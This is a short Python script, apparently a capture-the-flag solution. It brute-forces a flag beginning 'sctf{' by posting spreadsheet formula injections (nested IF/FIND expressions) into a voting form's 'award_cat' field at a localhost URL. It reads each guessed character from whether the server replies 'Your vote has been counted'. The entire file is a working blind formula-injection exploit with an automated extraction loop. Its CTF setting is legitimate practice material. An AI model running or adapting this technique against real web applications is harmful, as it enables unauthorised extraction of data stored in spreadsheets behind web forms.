import requests
from string import ascii_letters, digits
import time

def bruteforce():
    chars = ascii_letters + digits + '_?!$@}'
    flag = 'sctf{'

    url = 'http://127.0.0.1:9999/' # edit
    ctf_cat = "pwn"

    start = time.time()
    while flag[-1] != '}':
        for char in chars:
            test = flag + char
            award_cat = f"=IF(OR(C4=\"NIL\",IFERROR(FIND(\"{test}\",C4),0)=1),\"best\",\"no\")"

            r = requests.post(url, data={"award_cat": award_cat, "ctf_cat": ctf_cat})
            if 'Your vote has been counted' in r.text:
                flag = test
                print(flag)
                break
            else: 
                continue

    end = time.time()
    print(end - start)

bruteforce()

